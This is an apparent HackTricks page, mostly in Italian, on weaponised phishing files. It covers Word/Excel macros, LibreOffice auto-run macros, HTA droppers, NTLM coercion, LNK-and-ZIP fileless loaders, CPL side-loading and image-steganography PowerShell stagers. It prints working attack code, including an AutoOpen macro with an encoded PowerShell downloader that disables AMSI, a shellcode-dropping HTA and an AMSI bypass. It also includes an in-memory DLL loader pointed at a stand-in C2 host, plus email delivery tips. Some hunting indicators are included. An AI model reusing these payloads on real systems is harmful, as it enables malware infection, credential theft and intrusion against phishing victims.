# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Documenti Office

Microsoft Word esegue la convalida dei dati del file prima di aprirlo. La convalida dei dati viene eseguita sotto forma di identificazione della struttura dei dati, rispetto allo standard OfficeOpenXML. Se si verifica un errore durante l'identificazione della struttura dei dati, il file analizzato non verrà aperto.

Di solito, i file Word contenenti macro usano l'estensione `.docm`. Tuttavia, è possibile rinominare il file cambiandone l'estensione e mantenere comunque la capacità di eseguire macro.\
Per esempio, un file RTF non supporta le macro, per progettazione, ma un file DOCM rinominato in RTF verrà gestito da Microsoft Word e sarà in grado di eseguire macro.\
Gli stessi internals e meccanismi si applicano a tutto il software della suite Microsoft Office (Excel, PowerPoint, ecc.).

Puoi usare il seguente comando per verificare quali estensioni verranno eseguite da alcuni programmi Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files che fanno riferimento a un template remoto (File –Options –Add-ins –Manage: Templates –Go) che include macro possono anche “eseguire” macro.

### External Image Load

Vai a: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, e **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

È possibile usare le macro per eseguire codice arbitrario dal documento.

#### Autoload functions

Più sono comuni, più è probabile che l'AV le rilevi.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Rimuovere manualmente i metadati

Vai su **File > Info > Inspect Document > Inspect Document**, che aprirà il Document Inspector. Fai clic su **Inspect** e poi su **Remove All** accanto a **Document Properties and Personal Information**.

#### Estensione Doc

Una volta terminato, seleziona il menu a discesa **Save as type**, cambia il formato da **`.docx`** a **Word 97-2003 `.doc`**.\
Fai questo perché **non puoi salvare macro all'interno di un `.docx`** e c'è uno **stigma** **attorno** all'estensione **`.docm`** abilitata alle macro (ad es. l'icona della miniatura ha un enorme `!` e alcuni web/email gateway le bloccano del tutto). Pertanto, questa **estensione legacy `.doc` è il miglior compromesso**.

#### Generator di Macro Malevole

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

I documenti LibreOffice Writer possono incorporare macro Basic ed eseguirle automaticamente quando il file viene aperto, associando la macro all'evento **Open Document** (Tools → Customize → Events → Open Document → Macro…). Una semplice macro reverse shell è simile a:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Note le virgolette doppie (`""`) all'interno della stringa – LibreOffice Basic le usa per fare l'escape delle virgolette letterali, quindi payload che terminano con `...==""")` mantengono bilanciati sia il comando interno sia l'argomento di Shell.

Delivery tips:

- Salva come `.odt` e associa la macro all'evento del documento così viene eseguita subito all'apertura.
- Quando invii email con `swaks`, usa `--attach @resume.odt` (l'`@` è necessario così vengono inviati i byte del file, non la stringa del nome del file, come allegato). Questo è fondamentale quando si abusano di SMTP servers che accettano destinatari `RCPT TO` arbitrari senza validazione.

## HTA Files

Un HTA è un programma Windows che **combina HTML e scripting languages (come VBScript e JScript)**. Genera l'interfaccia utente ed esegue come applicazione "fully trusted", senza i vincoli del modello di sicurezza di un browser.

Un HTA viene eseguito usando **`mshta.exe`**, che di solito è **installato** insieme a **Internet Explorer**, rendendo **`mshta` dipendente da IE**. Quindi, se è stato disinstallato, gli HTA non potranno essere eseguiti.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

Ci sono diversi modi per **forzare l'autenticazione NTLM "remotamente"**, per esempio, potresti aggiungere **immagini invisibili** alle email o all'HTML che l'utente aprirà (anche HTTP MitM?). Oppure inviare alla vittima **l'indirizzo di file** che **attiveranno** un'**autenticazione** solo per **aprire la cartella**.

**Controlla queste idee e altre nelle pagine seguenti:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Non dimenticare che non puoi solo rubare l'hash o l'autenticazione ma anche **eseguire attacchi NTLM relay**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Campagne molto efficaci consegnano uno ZIP che contiene due documenti esca legittimi (PDF/DOCX) e un .lnk malevolo. L'idea è che il vero PowerShell loader sia memorizzato nei byte grezzi dello ZIP dopo un marker univoco, e il .lnk lo estrae e lo esegue interamente in memoria.

Flusso tipico implementato dal one-liner PowerShell del .lnk:

1) Individua lo ZIP originale nei percorsi comuni: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, e la cartella padre della directory di lavoro corrente.
2) Leggi i byte dello ZIP e trova un marker hardcoded (ad es., xFIQCV). Tutto ciò che segue il marker è il payload PowerShell incorporato.
3) Copia lo ZIP in %ProgramData%, estrailo lì, e apri il .docx esca per sembrare legittimo.
4) Bypassa AMSI per il processo corrente: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deoffusca lo stage successivo (ad es., rimuovi tutti i caratteri #) ed eseguilo in memoria.

Esempio di skeleton PowerShell per estrarre ed eseguire lo stage incorporato:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- La delivery spesso abusa di sottodomini PaaS affidabili (ad es. *.herokuapp.com) e può filtrare i payload (servendo ZIP benigni in base a IP/UA).
- La fase successiva spesso decripta shellcode base64/XOR ed esegue tramite Reflection.Emit + VirtualAlloc per ridurre al minimo gli artefatti su disco.

Persistence usata nella stessa catena
- COM TypeLib hijacking del controllo Microsoft Web Browser in modo che IE/Explorer o qualsiasi app che lo incorpora rilanci automaticamente il payload. Vedi dettagli e comandi pronti all'uso qui:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- File ZIP contenenti la stringa marker ASCII (ad es. xFIQCV) aggiunta ai dati dell'archivio.
- .lnk che enumera le cartelle padre/utente per localizzare lo ZIP e apre un documento esca.
- AMSI tampering tramite [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Thread di business a lunga esecuzione che terminano con link ospitati sotto domini PaaS affidabili.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Un altro pattern ricorrente è un **.lnk che impersona un documento** e apre subito un lure benigno mentre prepara in background la catena reale.

Workflow osservato:
1. Il collegamento **si maschera da PDF** e usa `conhost.exe` o un proxy simile per avviare un downloader PowerShell offuscato.
2. I frammenti PowerShell spezzano token evidenti (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) così che le detection naive che cercano `iwr`, `gci`, `ren`, `cpi` o `schtasks` non intercettino il comando.
3. Lo stager scarica prima il **documento esca**, lo apre per la vittima e poi ricostruisce i file malevoli in background.
4. I payload possono essere scritti con **estensioni junk** e poi rinominati rimuovendo i caratteri filler, ritardando la comparsa di evidenti artefatti `.exe` / `.cpl`.
5. La persistence viene stabilita con un **scheduled task basato sui minuti** che avvia un binary host affidabile da un percorso scrivibile dall'utente.

Indizi minimi di hunting da questo pattern:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Un layout di staging utile da riconoscere è:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Perché il secondo stage è stealthy

Nel case study di Rapid7, il scheduled task avviava ripetutamente **`Fondue.exe`** da `C:\Users\Public\`. Poiché **`APPWIZ.cpl`** era staged accanto ad esso ed esportava **`RunFODW`**, il trusted Microsoft binary caricava il CPL dell'attaccante invece della legittima copia di sistema.

Il CPL poi:
- Legge un blob **AES-256-CBC** da `C:\Windows\Tasks\editor.dat`
- Lo decripta tramite **Windows CNG / `bcrypt.dll`**
- Alloca memoria eseguibile e copia lo shellcode decriptato
- Lo esegue indirettamente passando il puntatore dello shellcode come callback per **`EnumUILanguagesW`**

Quest'ultimo passaggio merita di essere cercato separatamente: il malware spesso evita un salto diretto `((void(*)())buf)()` e invece abusa di una **legitimate callback-taking WinAPI** per trasferire l'esecuzione.

Il payload decriptato in questa campagna era shellcode **Donut**, che poi mappava il PE finale interamente in memoria e patchava **AMSI/WLDP/ETW** nel processo corrente prima di passare l'esecuzione. Per note più approfondite su side-loading e post-processing in memoria, vedi:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pivots pratici di hunting:
- `.lnk` che avvia `powershell.exe` o `conhost.exe` seguito da un documento decoy visibile.
- Download di breve durata verso **`C:\Users\Public\`** seguiti da rename immediati da estensioni senza senso.
- Scheduled tasks con nomi generici come `GoogleErrorReport` che eseguono da **user-writable directories**.
- Trusted binaries che caricano file **`.cpl` / `.dll`** dalla stessa directory non di sistema.
- Blob di testo Base64 scritti sotto **`C:\Windows\Tasks\`** e poi letti dal modulo side-loaded.

## Payload delimitati da steganografia nelle immagini (PowerShell stager)

Recenti catene loader distribuiscono JavaScript/VBS offuscato che decodifica ed esegue un PowerShell stager in Base64. Quel stager scarica un'immagine (spesso GIF) che contiene una .NET DLL codificata in Base64 nascosta come testo semplice tra marcatori univoci di inizio/fine. Lo script cerca questi delimitatori (esempi osservati in natura: «<<sudo_png>> … <<sudo_odt>>>»), estrae il testo intermedio, lo Base64-decodifica in bytes, carica l'assembly in-memory e invoca un metodo di entry noto con l'URL C2.

Workflow
- Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). See more about process hollowing and trusted utility proxy execution here:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Esempio PowerShell per estrarre una DLL da un'immagine e invocare un metodo .NET in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Note
- Questo è ATT&CK T1027.003 (steganography/marker-hiding). I marker variano tra campagne.
- AMSI/ETW bypass e la deobfuscation delle stringhe vengono comunemente applicati prima del caricamento dell'assembly.
- Hunting: analizza le immagini scaricate alla ricerca di delimitatori noti; identifica PowerShell che accede alle immagini e decodifica immediatamente blob Base64.

Vedi anche gli stego tools e le tecniche di carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Una fase iniziale ricorrente è un piccolo file `.js` o `.vbs`, fortemente obfuscated, distribuito dentro un archive. Il suo unico scopo è decodificare una stringa Base64 incorporata e avviare PowerShell con `-nop -w hidden -ep bypass` per avviare la fase successiva tramite HTTPS.

Logica scheletro (astratta):
- Legge il contenuto del proprio file
- Localizza un blob Base64 tra stringhe junk
- Decodifica in PowerShell ASCII
- Esegue con `wscript.exe`/`cscript.exe` che invocano `powershell.exe`

Indicatori di hunting
- Allegati JS/VBS archiviati che avviano `powershell.exe` con `-enc`/`FromBase64String` nella command line.
- `wscript.exe` che avvia `powershell.exe -nop -w hidden` da percorsi temp dell'user.

## Windows files to steal NTLM hashes

Controlla la pagina su **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
